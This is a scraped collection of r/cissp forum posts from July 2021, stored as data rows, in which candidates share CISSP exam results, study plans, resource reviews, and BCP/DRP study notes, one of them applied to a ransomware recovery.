* Work experience helped a lot, although I am not a tech guy I review lots of risk analysis and the mindset is similar.

Good luck to everyone ! I will go for CCSP in September :)",2021-07-20

2964,ooeqh5,CISSP Is Overhyped,"Context: I'm 18 and a senior in a Cybersecurity Engineering program

Did 25 practice problems last night and went in with an hour of sleep into the exam (Couldn't put down the video games lol). Exam ended at 120/150 question and I passed.

I felt offended at how easy it was. In my opinion, it was much easier than even Security+. And we all know how much of a joke Sec+ is.

If someone can study for the CISSP while taking 16 credits over the summer and playing Genshin Impact for 6 hours a day then I'm sorry but the exam has lost its credibility.

I will try for OSCP after the summer semester ends and hopefully it doesn't end like CISSP.

2966,onsqur,Study Partner/Study Group?,"Hello everyone. I am currently studying for the CISSP exam with my test date set for September 17th. I have been in the Info Sec world for a little over 4 years as a security generalist for 2 medium-large companies (technical title is Security Engineer but it's more a combo of engineering/analyst work/compliance stuff - basically whatever needs to be done).

I have read in various posts that having a study partner or being in a study group is a helpful tool, but I'm not quite sure what that entails - regular group study sessions? IMing each other questions? Having someone to console you when you realize your brain is too small to retain any knowledge??

My current study plan is:

1. **July 8 - Jul 30:** Self-Study with Mike Chapple Linked-In Course. Review with Pocket Prep app. Take test quizzes/exams on CISSPrep after finishing course videos.
2. **Aug 2 - 6:** TIA CISSP Bootcamp
3. **Aug 9 - September 15:** Review Bootcamp notes, Create Flashcards, More CISSPrep, Read Official Study Guide Cover to Cover (the book comes with my bootcamp), Do Practice material in Official Study Guide
4. **September 16:** sacrifice goat
5. **September 17:** PROFIT?

**I don't know if this is enough.** If feel so unprepared even though i have only been watching the course and taking notes for a little over a week. For my previous 2 certs (Sec+ and GCED) I just took a bootcamp, studied a little, took a few practice tests and I was ready to go. Had no issues with either exam. But I am dreading this one. 

So I'm wondering if adding a study buddy/study group will help me feel less...stupid? Or at least help me to know if I'm way off base with my learning. 

Thanks!",2021-07-20

2969,on293l,"Passed and certified, here are my thoughts.","Hey everyone, as the title states I provisionally passed my CISSP exam at the end of June and was fully certified by (ISC)² three weeks later. I delayed making a post to formulate my thoughts regarding the entire experience.  This post is kind of long, TLDR at the bottom. 

Initially I reviewed this subreddit to get a grasp of where to begin, though I will admit I didn’t follow the suggested study plan.  I studied lightly on/off for 3 months and diligently for 2 months. Make sure in the lead up you take time for yourself. If you begin feeling burnt, stop for a while.  Play some games, go for a run, or talk with a friend about non CISSP stuff. Studying through fatigue will only hurt you. 

For background I have 5 years direct information security work experience and a graduate level degree. 

Books
- CISSP All-in-One Exam Guide, Eighth Edition, 8th Edition - Rating: 8/10
- Sybex (ISC)² CISSP Certified Information Systems Security Professional Official Study Guide, 8th Edition - Rating: 10/10

The AIO helped me get into the right mindset regarding the exam. The dialogue referenced many real world applications of the concepts. 
The Sybex book was by far the best study resource for exam preparation.  It covered everything necessary for exam prep. 
When I encountered a topic or concept in either book I was unsure about (even slightly) I transcribed the definition or section verbatim into a spiral using a pencil (tactile feedback)

Practice Exams
- (ISC)² CISSP Certified Information Systems Security Professional Official Practice Tests (online bank included with the book) - Rating: 9/10
- Boson - Rating: 2/10
- Pocket prep (free 30 questions)- Rating: 3/10

The official practice tests online were invaluable for isolating the areas I had deficiencies in. Additionally, the flash cards were great for quick studying throughout the day. 
The Boson test bank was large, though in my opinion the program was clunky and the questions were not as useful as reviews I had read made them out to be. I didn’t use the Boson tests in the final stretch of my study. It may work for you, though I suggest trying the official practice tests (included in the official guide package) before shelling out money to Boson. 
PocketPrep was great for quick study when I was waiting in lines or had a spare moment. I didn’t purchase the full version as I had already purchased the Boson bank. 
Overall, the practice tests were nice to prepare me for timing on the exam and identifying deficient areas, though they are not reflective of the exam itself. As difficult as it may be, don’t put too much stock in the practice exam scores, instead use the data to focus your study efforts. I really dug my heels into practice exams in the final few days before the exam and found myself doing worse and burning myself out.  Much like the books I hand transcribed the answers to questions I got wrong and flagged them. 

Audio/Video
- CISSP, 2nd Edition Sari Greene - Rating: 7/10
- Destination Certification (YouTube) - Rating: 4/10
- Eleventh Hour CISSP Study Guide (Audible) - Rating: 10/10

Sari Green is great. The videos were encouraging and the knowledge tests assisted in recalling useful information. I will admit I didn’t finish the series as it wasn’t as in depth as the official study guide. 
The Destination Certification YouTube series was nice for background study and reference, though for me it was more of a feel good effort. Some of the graphics assisted me in mentally categorizing information. 
Eleventh Hour was fantastic. I snagged it on Audible in the final two weeks of study, listened to it at 1.25 speed while working out or cleaning and would make notes on my phone of topics I wanted to review in depth. This resource often highlighted information that I gleaned over in the books.

Endorsement Process
Once I passed, I created my account and submitted my application. There are no CISSP’s that I work with so I opted to have (ISC)² sponsor me. 2.5 weeks after submitting my application (ISC)² stated they needed additional verification of my work history. Unfortunately my place of employment refused to write/provide a letter of affirmation regarding work history and directed me to a third-party service. I provided the information to (ISC)² and received feedback that they will not interact with a third-party. (ISC)² then stated they were going to audit my application. I won’t lie to you all, this stressed my out after having read some horror stories on this subreddit. 
Nearly out of options, I provided tax documents (with sensitive information redacted) and unofficial transcripts. The next day I got a notification that my application was accepted and I could pay my membership fee.  

Overall, it was a lot of study and felt daunting at times. Take it a topic at a time, write things down, and take breaks! Good luck everyone!

TLDR: The Official (ISC)² study materials are S-tier, don’t stress over practice exam scores, take breaks and separate when you get tired.",2021-07-19

2971,omj3yq,7/10/21 Fail at 150 questions,"Sigh. Here I am writing the post I never wanted to write. I went for it on 7/10/21 and didn’t pass. Hoping to help others and get a little advice on the next steps to take. 

Per my previous post [here](https://www.reddit.com/r/cissp/comments/oexlqz/cue_the_panic_5_days_until_exam_date/?utm_source=share&utm_medium=web2x&context=3), I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. I'd been studying off and on for a little over a year, four consecutive months of intense study, and utilized the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I’d also taken a 10-week boot camp class three times.

I knew there were topics I didn’t have down 100% but felt I *probably* knew enough to get me by. When I sat down at the computer to take my exam, I knew I was in trouble 20 questions in. The questions looked so foreign and vague. I read and reread and reread every question, breaking the sentence down by word, looking for some semblance of anything I’d seen before. I couldn’t make sense of any of it. I had anticipated this since that’s what everyone says but that didn’t cushion the shock.

I went all the way to 150 questions. I saw a lot of questions on SDLC, at least five questions on SOC compliance and a few on DRP/BCP. Nothing super technical with the exception of a few IPSec and tunneling protocol questions. Nothing on Kerberos, nothing on OSI. Out of all 150, I felt confident I knew the answer on maybe 5 questions. 

What’s really crazy is that I had “think like a manager; don’t DO anything” tattooed on the inside of brain going in. But none of the questions, nor any of the answers, within my exam were structured that way or provided answers that were that high-level. I’m not a technical person so it’s not my instinct to “fix” anything. There weren’t any “weeds” to get into. The questions weren’t super technical but they most definitely weren’t high-level. Somewhere in between, if that makes sense. 

I was below proficiency in four domains, near proficiency in three, and above in one domain. Interestingly, the domains I’d considered my weak domains while studying were my strongest, and my strong domains were “below proficiency.”

So now I’m trying to decide what to do: whether to give it another go or maybe try another certification like Security+ to help build up my confidence. There’s a real big part of me that wants to keep going and build onto the momentum I had and try again in 60-90 days. There’s another smaller part of me that wants to walk away from it completely and get my life back again and enjoy the rest of my summer.

Any advice, opinions, feedback? Should I try again or go for Security+? Is this just too big an elephant to eat for a non-technical professional?",2021-07-18

Quick question. do we have to know the Electronic Discovery Reference Model (EDRM) process in order?",2021-07-18
2973,om95hn,BCP/DRP Quick Notes,"Some general BCP/DRP notes I had lying around if it helps anyone:

At a high-level, the most important thing to remember is that a BCP/DRP program has two main objectives: the first one is to preserve human life, to keep the human heart beating.  Second is one of the corners of the CIA Triad: availability.  Much like the human heart, the second high-level objective is to keep the lights blinking and systems online.

The topic of proper business continuity and disaster recovery planning is **highly testable**.

BCP process and steps (Not specifics, just the general flow)

* Components of the Business Impact Analysis (ARO, MTTR, MTBF, SLE)
* The idea that all stakeholders of a BCP should be involved in the planning
* Business continuation strategies
* The importance of documentation

**Here are some important concepts to remember**:

* The process of recovering an organization's critical business functions after a disaster is known as BCP
* Dealing with a more immediate or specific emergency is known as DRP.
* Difference between BCP and DRP
* BCP is more high-level than DRP.  DRP falls under the umbrella of BCP.
* ""What if our main data center was destroyed by an earthquake, what do we do?"" - That's BCP.
* ""What if our firewall failed at our main data center, what do we do?"" - That's DRP.
* The start of any organization's DRP/BCP program must have the approval of the senior management team
* Management's approval is also a show of their support
* BCP/DRP is all about documentation, documentation, documentation
* According to the CISSP, the first thing to look for in a disaster is the proper documentation that contains procedures and guidelines on how to deal with a disaster
* As with all things CISSP, keep the BCP/DRP document alive with regular updates.  Changes to the organization's governance, infrastructure, or an addition of a new technology should be reflected in the BCP/DRP.  Users and executives alike should also accumulate a certain level of training, education, and security awareness to contribute to a strong BCP/DRP program.

**Here are some types of disasters**:

* Man-made
* Negligence
* Warfare
* Fires
* Terrorism
* Insider threat
* Cyber attack
* Natural
* Flood
* Earthquake
* Tornado
* Tsunami

**The basic steps of a sound BCP are**:

* Phase 1: Scope and Initiation
* Phase 2: Business Impact Analysis
* Phase 3: Recovery Strategies and Continuity Development
* Phase 4: Implementation and Testing
* Phase 5: Maintenance

**RTO vs RPO vs MTTF vs MTTR**

RTO is the maximum amount of time that is needed to bring critical business functions back to normal operating status before that business is crushed.

RPO is the measure of at what point in time a business can go back and still salvage enough data to fully operate.  For example, can a business lose all the data it has accumulated in the last 10 minutes and still operate as a business? Probably.  But can it lose all the data it has accumulated in a 12 hour period and still function? This depends on the type of business.  A company that deals with the stock market and money, probably has a really short RPO, compared to a school with a database of past test scores, which could have a longer RPO.

MTTF as we stated is the same thing as MTBF.  It is the measure of how long something is supposed to operate before failure.

MTTR is the amount of time required that is necessary to bring a critical business function back to operation.  The mean time to recovery for your 2nd monitor in a dual monitor setup can probably be 72 hours to a week before you start finding it necessary to have a 2nd monitor again.  The mean time to recovery for your mouse is probably a lot shorter, maybe minutes to hours?

I took the test yesterday just out of whim. I'm a network administrator with 8 years experience. I honestly think that Security+ was harder than the CISSP exam and I think that could be attributed to the large body of knowledge and question pool that usually comes with CompTIA exams. I'm at the tail end of a Cybersecurity degree so maybe that helped out but I just went in to the test with a ""ain't nothing to it but to do it"" attitude. The body of knowledge illustrated by ISC2 is crucial to planning out how you need to study if you have prior knowledge of the field. I think my networking experience helped out too. The toughest part for us technical folks I believe would be moving away from our traditional thought process when it comes to solving problems. There are going to be multiple choices that feel like the right answer but it's all about management mentality that'll help find the ""most"" right answer. CBT nuggets helped as a sort of passive learning tool just by being able to put it on while I'm driving too and from work.

**Preparation**:
 * This subreddit - Honestly I would not have passed if it wasn't for you guys. All the resources I used below (except the OSG) I found out through all of you.   
 * OSG 8th edition - very comprehensive but I think one of the best resources.   
 * Kelly Handherhan's course on Cybrary - Her delivery and teaching style cements concepts into your brain.   
 * Destination Certification Mindmap videos and CISSP CRAM on Youtube - Very useful for reinforcements. Highly recommend watching these 1 or 2 weeks before the exam   
 * CISSPprep.net - This one was amazing. I felt the real exam questions were similar to the questions here. It was frustrating because I was scoring only 60% on an average but helped me a lot in identifying my weak areas.  
 * Eric Conrad 11th Hour CISSP - Unpopular opinion but this didn't work for me.   
 * Official practice tests 2nd edition - Make sure to read the reasons for why something was right or wasn't right.  
 * Kelly Handerhan - why you will pass the CISSP - cannot recommend this enough.   

**The Exam**: Can't say anything that hasn't been said before. Most of the questions I could boil it down to two options, some questions were direct. I honestly thought I failed. Do not bother memorizing anything. I made sure I read each question 2-3 times and put on my manager hat.

2994,oi6439,Passed - 2'nd Attempt,"All, 

Would just like to give my 2 cents since I passed the exam yesterday and previously posted in this forum about failing this exam in February.  Honestly, it was heartbreaking back then and I didn't even know if I wanted to go through the process again.  I somehow found the motivation to give it one more try and I passed yesterday with literally seconds left at 120+ questions.  I thought for sure I would fail or that I'd run out of time as the questions kept coming in. 

The exam is an absolute beast and I don't think any amount of studying will fully prepare you for this thing.  Even on the second attempt, I felt complete beaten up by the test and saw things that I saw no where within the study materials.  I'd estimate I studied over 250+ hours combining from the first test. 

I honestly can't say anything that you don't already know.  You need to study the normal materials, but you also just need to have the right mindset.  Thinking like a manager is easy to say, but I'm just not sure how much that carries on this test when you're going through it.  I'd say my best advice is don't worry about knowing specific definitions, but knowing exactly how everything works in a real world setting is much more important. 

Also I went with the approach of reading the question multiple times and even purposely slowed down on questions I knew the answer.  I don't think this is a good approach considering I literally had seconds left with potentially a LOT of questions left if the exam was to continue. 

I am beyond relieved and taking some much needed time off.",2021-07-11
2995,oi3d0v,"Passed @100 - 120 minutes, 2nd Attempts","I cannot explain the joy and mental relief of passing this exam, especially after failing on 1st attempt. I was panic reading until last minute trying to cramp as much knowledge as possible, my best advice is to relax on the exam day.  After around 15-20 questions I started to develop the feeling that I will surely fail the exam.  Like many of you said in past no test bank will prepare you for the actual exam questions. They are worded differently and make you feel tempted to click the wrong answer, be sure to read the question multiple times. There were questions where i purely guessed the answer as I never read those topics in my life. I was mentally exhausted and was preparing for the worst and after 100 question the test stopped.  I went to the front and received the result and to my surprise i passed, i couldn't hold my excitement and shouted a big YEESSSSSSSS.  While collecting the items the tears rolled down (its okay to cry). This exam was not just exam it was my dream, I am not sure what it will hold in future but it was my first professional level exam and i gave all for this exam. I always stayed around 2 hr after work just to study for the exam. I prepared this exam for almost 1 year getting distracted in between with free COMPTIA beta exams. I am currently in US in F1 visa (student) and its really hard to find the Job, the struggle is REAL.  My Background 5 Years in General IT (Network support/ Help Desk support/Jr System admin stuff )in home country never had any true Security Position. I want to get my foot into Security, i hope this certification will help at least to pass through the ATS.  I currently hold CCNA, Security+, and recently took CompTIA Pentest beta and CASP beta.   


Following are the material i used, i will not rate as i am not good at it :) everything was helpful during the journey.

* (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition 
* (ISC)2 CISSP Official Practice Test, 2e. I would recommend to register it online so that it will be easier and can explore other features.
* Eleventh Hour CISSP Study Guide
* Boson Practice Test - Make sure to read the explanation. 
* Destination Certification - YouTube channel - Rob Witcher. This can be helpful to refresh you content.
* And many random YouTube videos. 
* And yes this SUB for others experience and motivation.

2996,ohxoha,Passed today - was certain I didnt!,"First - I'm making this post because reading everyone elses helped me a LOT. So, Reddit = 10/10

Second - I'm an idiot, I don't learn fast, and this shit was hard to study for. If you are reading this you are smarter than I am - you will pass this.

The exam was brutal. 20 questions in and I'm already mentally preparing to fail. The test stopped at 100Q and I would have bet $100 it was because I couldn't mathematically pass with more Qs. I shit bricks when I saw the Congrats. So here my biggest takeaways -

I used very few resources

\- the 2018 official guide and matching practice exam book(has 1000+ Q's, get this!),

\-the Syngress 3rd edition study guide and the Syngress 11th hr book (same authors)

\- Boson practice tests.

\-Thats it.  No new material studied for the updated exam - not needed!

Here's what I did

\- read every book, cover to cover, and highlighted the important concepts /facts.  If any of the material puts information in an outlined box - that's not extra info, its stuff you REALLY need to know.

\-Practice tests. Do as many as you can, find your weak domains, go back to the books and skim through your highlights, and take more tests.  Do NOT memorize the answers to your practice test, I promise this is a sure way to fail.

&#x200B;

* Key to passing- Answer your practice question correctly, then explain to yourself \*why\* the question was correct.  I didn't come across a single question on the real exam that resembled anything close to the 2000+ practice questions I took, but understanding why you chose the practice question answer is the secret sauce.  Add Kelly Henderson video ""Why you will pass"" and you can shit bricks when you see ""Congratulations"" on your test results too.",2021-07-11

3000,oh9f9h,"Passed at 100 questions, ~2 weeks of study, 7 years IS experience","
Got sort of voluntold to get this by EOY about a month ago. Did the Training Camp bootcamp (I do not recommended, more below) last week as I had a “free” week between engagements. Hadn’t done anything at all prior to that week. Exam was not yet scheduled at the start of bootcamp. A couple days into the class one opened up for today, so I grabbed it. 
I’ll just say that the timing with this PrintNightmare… nightmare could not have been worse.

I did the bootcamp (Monday-Saturday morning).
Did nothing on Sunday.
Did a few practice tests Monday (holiday)
Tuesday actually got some real studying with notes and everything!
Wednesday all hell broke loose with the PrintNightmare patch and that sort of took over the rest of the week for me. My study time turned into very short (10-15 question) practice tests when I could grab a few minutes during the workday, then did the real ones (100-150) after hours. 
Exam was this afternoon, Friday, and I can’t wait to actually sleep tonight. 

I passed at 100 questions and I have no idea what the time was.
I was just as surprised how confident I was with many of the questions as I was with how many I stared at and second guessed for probably far too long. 

Study materials:
- Training Camp Bootcamp - I chose the virtual classroom option, not knowing that it was actually a hybrid class and I’d basically just be sitting on mute watching a live class with no real interaction. The instructor I had elected not to use the ISC2 training materials provided his own stuff, which he had not yet updated for the new CBK. There were some other issues, but those was the main ones. 
- CISSPrep - I literally got an account last night after seeing someone on here mention that their practice tests are hard. I wish I’d known about that sooner, probably would have passed on Training Camp, or any live training, entirely. 

Practice exams:
- CISSPrep - I found these to be the best. They’re hard, and it can be discouraging to do poorly. I found that the questions forced me to think the right way. Feedback on missed questions is both great and can be incredibly frustrating because if you miss a “not tricky” one it forces you to go look it up yourself and you actually LEARN.
- Sybex (latest version of the book, online question bank, and the app) - these were ok. The online bank and the app didn’t sync well, so I kept getting repeat questions despite toggling that setting off. It could stand to give better feedback on missed questions. 
- PocketPrep - Found it useful for short quizzes. Probably could have gone without this one but that’s ok. I liked being able to see the user average.
- CCCure - This was way more frustrating than it was helpful. I guess they let others contribute to their test bank to have it be like the real question pool where you’ll encounter questions written in different ways, but after awhile you start to be able to pick out questions by author, especially the bad ones, and there are bad ones. And with that comes a lot of inconsistency in answer explanation. Definitely could have gone without this one, and it was the most expensive by more than double. It was also recommended by the TC instructor but that’s neither here nor there.


Wow I did not intend for this to be so long, I’m sorry! I do hope this can be helpful to someone!!",2021-07-10
3001,oh3qjj,"Pass @ 100 Questions - 2 weeks of study, 10 years of IS experience (4yrs as CISO)","**And if you're newer to the industry: Even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!**

About 5 years ago I was planning on getting my CISSP, but I got a promotion to a CISO and never felt the need to get it. Fast forward to remote work culture (and a few kids later) and now I'm re-evaluating where I want to be in the future (hint: It's less management and more technical problem solving).

I found this board and noted a few things. One that stood out was the PocketPrep resource. I took a few free practice exams to gauge where I was. Initial tests showed that I was averaging about 60%. I figured with a bit of hard-core ADHD studying, I could get it done. I bought the 8th edition of Shon and read that from cover-to-cover (highlighting all the important pieces) over the course of a week (coffee break? Grab the book. Bathroom break? Grab the book. Every meal? Grab the book).  I subscribed to PocketPrep and after reviewing Shon, I took a few exams. Where I was coming up short, I went back and refreshed on those domains. After burning through the rest of the PocketPrep question bank (with about 3 days to go), I found a question bank from Cybrary/Kaplan ([https://app.cybrary.it/immersive/enrollment/activity/27008376](https://app.cybrary.it/immersive/enrollment/activity/27008376)) and used their bank. After going through those questions, I realized that Shon was a little light in certain areas (despite the fact that it's 1300 pages). If I had more time, I probably would have acquired their referenced source as Shon does did not even reference some of the items found in the Kaplan questions ([https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691](https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691)).

Overall the exam included a lot of ""BEST"" or ""MOST"" answers and as a professional who lives in grey waters, I could constantly hear myself say ""It depends"", but context seemed to always be lacking. I honestly still don't know what the right answer was for most of them as often times it felt as though all 4 were correct, it just depended on your definition of ""BEST"".

At 100 questions/90 minutes I got kicked out. Since I was already borderline when I first took some practice questions, I took that as a good sign.

My job experience:  
4 years CISO (Definitely helped as I've dealt with a lot of this information from OJT and never heard of a lot of it when I was in my engineering roles)  
5 years in Analyst/Engineer Roles  
10 years of various IT/Sysadmin positions  


If you've been in the industry for a while, these questions still suck, but just buckle down for a few weeks-month and press through it. You got this!

And if you're newer to the industry, even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!",2021-07-09
3002,oh7un9,Just my $.02,"Provisional passed today at 100 questions, about 90 min. What a relief. My story is probably different than most.

I have 25 years of experience, obtained dozens of certs and have been in CIO position for last 7 years. I recently passed CISM and decided to also re-take cissp, so I did…..and failed. I don’t settle for f’en failure so back to the books. Honesty the hardest exam I have ever taken. It’s doable but geez, you have to earn it. Dedicate yourself to the study materiel that’s available, other posts have mentioned and honestly, they will all get you there.

3003,ogv3ld,Passed at 150 Questions and 3 Hours,"Took the exam and passed at 150 questions. I was pleasantly surprised and to be honest I did not expect to read Congratulations on the sheet after I left the testing center. 

One of the weirdest elements of my exam was that it almost felt like the exam was trying to get me to pass. As I passed question 100 I received many questions on concepts that I was most strong in. It really did start to mess with my head because I just assumed that the exam was just feeding me questions to get to 150 as I couldn’t understand how I got the same question on SOC reporting rephrased 5 different ways. 

Studying consisted of:

- Training Camp Boot Camp
- CISSP Exam Cram Youtube Videos
- Study Notes and Theory Test Questions (~200)
- Sybex Test Questions (~300)
- Luke Ahmeds How to Think Like a Manager for the CISSP

Overall i’d say the Exam Cram videos were the best to jog my memory on all the concepts leading up to the Exam. I don’t think I took the conventional study method as I took the Training Camp bootcamp and sat for the exam a few weeks later. I’ll be honest that my exam prep wasn’t the greatest as I only had limited nights and weekends to dedicate. But the week leading up I had 2 full day cram sessions (the day before and the day of the exam).

3007,ogfy0o,Passed the CISSP exam last week. Here's how I studied.,"I'll start with a big thank you to everyone that has posted what worked or didn't for them while studying. I gained a lot of insight browsing through numerous posts. I don't have any incredible insights, but below is what I used to pass the exam and hopefully someone can get some use out of it.

Almost all of the sources I used are available for free via O’Reilly/Safari Online if you have a DoD email.

 

Video Courses:

- Cybrary CISSP Video Course [Free]- Kelly Handerhan (15 hours) 
This course does a tremendous job of highlighting all of the major topics in each domain. Provides examples that make concepts relatable and easy to digest.


- CISSP Certification Video Boot Camp [Free w/O'Reilly account] – Thor Pederson (24.5 hours)
Provides a lot of practical examples. Examples are framed in a way that aligns to the “CISSP mindset.”


- CISSP Cert Prep [Free trial via LinkedIn Learning] – Mike Chapple (24 hours)
This was the only source updated for the new version of the exam released in May that I used. This series does a good job covering Domain 3 compared to the other sources.

- CISSP Complete Video Course, Second Edition [Free] – Sari Greene (26 hours)
This course is more formal and in-depth, heavily focuses on practical application of topics (some are not relevant to the exam).

- Mind Map [Free] – YouTube (6.5 hours)
Short and well-produced. They do a good job of summarizing topics within each domain and provide an organized view of the material. It’s a good source for a quick overview of each Domain or as a last minute review.



Text Materials:

- Eleventh Hour CISSP Study Guide [Free with O'Reilly]
Good for an overall introduction to CISSP topics. Some of the topics are dated, so keep that in mind if you use this for review.
 
- (ISC)2 CISSP Certified Information Systems Security Professional Official Study Guide 8th Edition [$40]

- “Sunflower” CISSP Summary Version 2.0 [Free]
Wasn't a fan of this, but I did use it as a final review.
 

Practice Exams:

-(ISC)2 CISSP Official Study Guide, 8e [Free if you buy the book]

- CISSP Official (ISC)2 Practice Tests [Free with O'Reilly account]


Misc:

- Why you WILL pass the CISSP – Kelly Handerhan via YouTube
Great job of covering the mindset you need to pass the exam.

- Essential CISSP Exam Guide: 2018 CBK [$14.99] – Audible (17 hours)
The audio quality is not the best, but I found this to be useful when I didn’t have time to sit down and study.

 

My Study Schedule:

I studied over a 3 month period. The first month was largely spent easing into an overview of each domain and trying to establish foundational knowledge to build upon later. During the first month I totaled 62 hours of study, a little over 2 hours per day. The second month was focused on diving deeper into the material, powering through multiple video courses, and taking a couple practice exams to determine where I stood. During the second month I increased my total study hours for the month to 82, averaging approx. 2 hours and 40 minutes per day. I spent the final month reading the official study guide and taking practice exams (I answered approx. 1,500 questions during this period). Overall, I spent 110 hours studying in this final month, averaging a little over 4 hours per day. I increased my study efforts during the final week before the exam, studying 36 hours during the final 7 days. All of this time was spent reviewing and not trying to learn new material.

 

Recap:

Month 1: 62 hours (2 hrs/day) - Intro to each domain
Month 2: 82 hours (2.5 hrs/day) - Deep dives
Month 3: 110 hours (4 hrs/day) - Practice Exams and reviews
 

Final Thoughts:

1. Develop a plan early and stick to it. Use some of the shorter study items to identify your strong and weak domains. Build your study plan around these results.

2. Don’t try to become an expert in your weak domains. Put in the time to become proficient, but don’t ignore the other domains.

3. Learn the logical processes as opposed to memorizing exact steps. Understand how everything fits together instead of memorizing definitions.

4. Remember to approach the test with the appropriate mindset.

5. Practice tests are important to identify knowledge gaps, but don’t try to memorize the answers. Read the explanations and try to understand why each answer is the correct choice.

6. Take a few breaks from studying where you don’t review any CISSP material for a day or two. Especially the day before the exam.

 

TLDR: There is a lot of free material available to those with a DoD email account. Set a goal and stick to it. Take some breaks and find time to relax and have some fun. Spend time reviewing questions on the exam and approach the test with the appropriate mindset. When you get close to your exam date, trust that you've done enough to prepare yourself and take a break the day before. Best of luck!",2021-07-08

3017,of0f0r,Passed today. Everything they say is true...,"I passed today with 100 questions in about 80 minutes. All of my questions were from left field. It's like the test writers said ""okay, you read the Sybex Guide? Good, so you know the terminology. But since you have 5+ years of security experience, you should know how to solve this hypothetical problem that's tangentially based on the this risk management principle..."" 

It's like it doesn't test you on your knowledge of the material, but rather on your ability to internalize a and articulate the principles in scenarios you've never contemplated. 

Or what's more -- it's like you're going to an oracle and telling her you're worthy of CISSP. You act like you're worthy, but the whole time, deep down, you question if you're really worthy (i.e. you expect to see FAIL at the end). In then end the oracle is never wrong. Now I just have to wait until my psychometric evaluation is complete to see if I can get past my provisional pass. Hopefully I'm worthy. 

Study materials (in no order):

1) Sybex book

2) Mike Chapple LinkedIn Learning (All Domains)

3) Thor Teaches (Domain 1 and 2)

4) Wiley Sybex App quizzes

5) Self-paced Online course from uCertify (paid for by my employer). This has quizzes and labs. 

It's hard to say which one was the best. But the uCertify course was long and I has to finish it all to get a test voucher, so it certainly had the biggest impact on me. 

Good luck to you all!",2021-07-06
3018,of9geh,Fujifilm Ransomware BCP/DRP CISSP Correlation,"Greetings, I wish everyone good luck on their CISSP exam this week.  With all the ransomware news, I was especially impressed with the way Fujifilm handled their ransomware incident.  They didn't pay the ransom and recovered operations from backup.  Just thought I'd share some notes of what I thought Fujifilm's BCP/DRP process may have looked like if it helps to correlate the real-life event to your CISSP studies.  Everything below is hypothetical and just used as an example to apply CISSP concepts to real life.  These are just guesses.  

BCP/DRP Process (General) Steps

  **Step 1** **is defining a policy, narrowing down the scope, and beginning the initiation of the BCP/DRP**

*  For Fujifilm, their senior management probably did have a clear policy and scope defined.  
* We can tell they had a policy and scope because when the article I was reading on the publication “Verdict”, asked the company if they had sufficient backups, their response was “Fujifilm does have **backups** in place as a part of its **normal operations procedure** aligned with its **policy**”.
* If Fujifilm had a policy about normal operations procedures after a disaster, it means they definitely had a policy to have a BCP/DRP plan in the first place, because as we know, nothing gets done in a company without first having a policy from senior management.
* Because Fujifilm had a policy to have a BCP/DRP plan in the first place, it attributed to their successful recovery of operations. 
* Otherwise, if there was no policy or a BCP/DRP plan, things would not have gone as smoothly.
* During the ransomware attack nobody would know what to do, what direction to go, how to handle the situation…nothing.  It takes a policy from management to create the BCP/DRP plan, which will provide the pathway to how to handle a disaster.  

  **Step 2 Business Impact Analysis - Define the critical business functions and resources**

* Fujifilm's Chief of Operations could state that if the data on those servers were being held for ransom, the business would come to a standstill, and the data would be needed back in order to continue operations. 
* The Director of Network Operations could say that if their Content Delivery Network solution were to stop working, that would stop the organization’s e-commerce business process, and would result in a heavy loss of revenue.  
* Both provided a technical issue, but also stated how it would affect the overall revenue-generating process of the company (both technical and high-level reasons)

  **Step 3** **- Contingency Strategies (Decide the most cost-effective and reasonable recovery strategy)**

* According to FIPS 199 an impact level of ""High"" would mean any damage or disruption to assets with this rating could halt everything in the business, the organization, the objectives, the networks, systems, applications
* Suggested backup is real-time replication of data as well as WAN/VLAN replication
* Suggested recovery strategy is a hot site

  **Step 4 - Testing and Maintenance** 

* Out of all the tests, maybe they most likely did a parallel test
* Businesses are hesitant about a full-interruption test as it means to stop the business
* If it was a structured walkthrough then individuals who head their own respective departments come together and discuss responsibilities
* If they did a simulation test, they would have all their BCP coordinators, BCP team, network engineers or their bosses, or other operational and mid-level management there to participate.  
   * Meaning, it’s just a simulation, but you have to act like it's happening.  Fujifilm probably checked to make sure their backups were processing, and ran through some things to see if the backups could be retrieved, without actually fully recovering them.  
   * They just simulated not only the disaster, but also the response, nothing “actually” was done like in a parallel test.  
* And of course, as with all CISSP processes, make sure there is documentation  
* Also updating the BCP/DRP document in case of any of these changes: 
   * Major changes to the company’s network or system architecture 
   * Changes to senior management
   * The addition or removal of certain technology
* Documentation and updating changes to the BCP/DRP document is all part of ""maintenance""

I thought it was neat how Fujifilm didn't pay the ransom and initiated a successful BCP/DRP.

Have a solid week ahead.",2021-07-07

3020,oexlqz,Cue the panic - 5 days until exam date,"Like many, I've just been lurking here, reading nearly every success and horror story. I'm five days out from exam time and the panic is starting to set in. I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. 

I've been studying off and on for a little over a year, four consecutive months of intense study, and have been utilizing the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I've also taken a 10-week  bootcamp class three times (seems excessive now that I'm writing that out!). The OSG was a last minute add but it's been helpful to switch things up a bit; I'd found I was getting too used to Boson's question formatting. 

I'm scoring 75-80% in Boson and the OSG test banks. Around the same in PocketPrep. I've answered thousands of practice questions and made thousands of flashcards. This week I'm trying not to panic-cram but instead focus on really honing in on the BCP, DRP, SDLC and incident response phases/processes. Also Kerberos because those terms are tricky AF. Domain 4 will always be my weakest domain since I had no idea what a packet was and had never heard of the OSI model before starting to study for the CISSP (true story). While I know the basics, I've resigned to the fact I'll never remember what every single protocol does. I'm hoping that my lack of technical background will help me think less like a problem-solver and more like a manager since that's really all I know. 

I've scheduled (and rescheduled) the exam 3 times but this time I'm going for it. My brain is cooked; even if I had another month before the exam, I don't know that I could retain anything additional. Anything you'd recommend for the last couple days before the exam (besides more panic)?",2021-07-06
